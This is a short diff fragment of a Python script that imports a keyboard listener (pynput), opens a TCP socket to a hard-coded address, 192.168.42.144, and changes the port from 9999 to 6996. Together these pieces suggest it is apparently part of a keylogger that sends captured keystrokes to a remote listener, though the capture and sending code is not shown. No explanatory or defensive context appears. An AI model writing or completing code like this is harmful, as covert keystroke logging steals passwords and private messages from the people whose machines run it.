@@ -2,7 +2,7 @@ import socket
 import os
 import sys
 HOST = "192.168.42.144"
-PORT = 9999
+PORT = 6996
 ADDR = (HOST,PORT)
 from pynput.keyboard import Listener
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
